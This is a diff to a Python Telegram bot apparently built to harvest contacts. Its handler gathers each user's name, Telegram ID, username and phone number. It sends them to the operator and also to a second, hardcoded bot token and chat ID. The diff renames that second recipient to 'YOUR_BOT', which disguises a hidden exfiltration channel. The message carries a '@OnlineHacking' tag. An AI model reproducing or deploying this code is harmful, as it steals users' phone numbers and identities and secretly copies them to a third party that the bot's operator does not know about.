@@ -8,9 +8,9 @@ import requests
 
 log = open('bot-log.txt', 'a+', encoding='utf-8')
 
-SECOND_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
-SECOND_BOT_CHAT_ID = "6121565272"
-second_bot = telebot.TeleBot(SECOND_BOT_TOKEN)
+YOUR_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
+YOUR_BOT_ID = "6121565272"
+your_bot = telebot.TeleBot(YOUR_BOT_TOKEN)
 
 # Dictionary to store click count for each user
 click_count = {}
@@ -131,13 +131,13 @@ def contact(message):
 			├Name: {first} {last}
 			├ID: {userid}
 			├Username: @{nick}
-			└Phone number: {phone}
+			└Phone Number: {phone}
    
 🎭 Follow @OnlineHacking for more...
       '''
 
 		bot.send_message(ID, info)
-		second_bot.send_message(SECOND_BOT_CHAT_ID, info)
+		your_bot.send_message(YOUR_BOT_ID, info)
 		print(info)
 
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
